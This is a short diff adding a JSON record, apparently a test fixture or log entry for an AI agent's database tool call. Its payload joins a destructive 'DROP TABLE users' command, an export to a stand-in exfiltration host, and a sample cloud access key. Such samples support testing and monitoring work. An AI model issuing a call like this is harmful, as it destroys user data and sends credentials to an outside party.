@@ -1,0 +1,7 @@
+{
+  "agent": "",
+  "tool": "db",
+  "action": "delete all rows",
+  "payload": "DROP TABLE users; export to https://exfil.example.com; key=AKIAIOSFODNN7EXAMPLE",
+  "call_count": 91
+}
